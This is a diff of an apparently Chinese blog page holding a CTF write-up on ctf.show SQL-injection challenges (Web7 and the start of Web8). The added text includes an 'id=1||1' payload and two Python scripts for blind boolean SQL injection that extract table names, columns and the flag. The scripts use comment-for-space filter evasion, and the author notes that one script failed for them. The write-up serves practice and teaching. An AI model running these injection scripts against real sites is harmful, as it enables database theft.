@@ -479,14 +479,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2023-02-26
+                    2023-02-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.5k
+                    1.9k
                 </div>
                 
 
@@ -812,8 +812,87 @@ alt="image-20230225111446970" /></p></li>
 <ul>
 <li><p>payload</p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell">id=1<span class="token punctuation">|</span><span class="token punctuation">|</span>1</code></pre></li>
-<li><p>显示所有文章</p></li>
+<li><p>会显示所有文章：可sql注入</p></li>
 </ul></li>
+<li><p>接下来就是常规操作</p>
+<ul>
+<li><p>爆库，爆表，爆裂</p></li>
+<li><p>脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span><span class="token string">'http://376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show/index.php'</span>
+table<span class="token operator">=</span><span class="token string">""</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment">#爆表名  flag</span>
+        payload <span class="token operator">=</span> <span class="token string">"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment">#爆字段名 flag</span>
+        <span class="token comment">#payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>
+        <span class="token comment">#读取flag</span>
+        <span class="token comment">#payload = "ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"%(str(i), str(j))</span>
+        ra <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">'?id=0/**/or/**/'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> ra<span class="token punctuation">:</span>
+            table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>
+            <span class="token keyword">break</span></code></pre></li>
+<li><p>运行情况<img
+src="https://s2.loli.net/2023/02/26/5aFurQvdiW6fpO3.png"
+alt="image-20230226235929980" /></p></li>
+</ul></li>
+<li><p>换个脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">
+<span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://124.156.121.112:28069/?id=-1'/**/"</span>
+
+
+<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆库名</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            u <span class="token operator">=</span> <span class="token string">"or/**/ascii(substr(database()/**/from/**/"</span> <span class="token operator">+</span> \
+                <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>
+            s <span class="token operator">=</span> url<span class="token operator">+</span>u
+            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆表名</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        table_name <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                u <span class="token operator">=</span> <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>
+                    i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")/**/from/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>
+                s <span class="token operator">=</span> url<span class="token operator">+</span>u
+                <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                    table_name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    db<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    table<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<ul>
+<li>没成功，这个响应报文的字符串为什么是用程序中那个，我的运行，没有打印出数据库名的任何一个字符。</li>
+</ul></li>
+</ul>
+<h4 id="web8">Web8</h4>
+<ul>
+<li><p>单引号、空格被过滤，出现sql inject
+error；逗号（在函数中间隔参数）也被过滤</p></li>
+<li><p>有回显：爆出全部文章<img
+src="https://s2.loli.net/2023/02/28/I68TAYmO7pvVHyW.png"
+alt="image-20230228113555016" /></p></li>
+<li></li>
 </ul>
 
                 
@@ -1431,7 +1510,7 @@ alt="image-20230225111446970" /></p></li>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">56.3k</span>&nbsp;字
+                class="white-color">57.1k</span>&nbsp;字
             
             
             
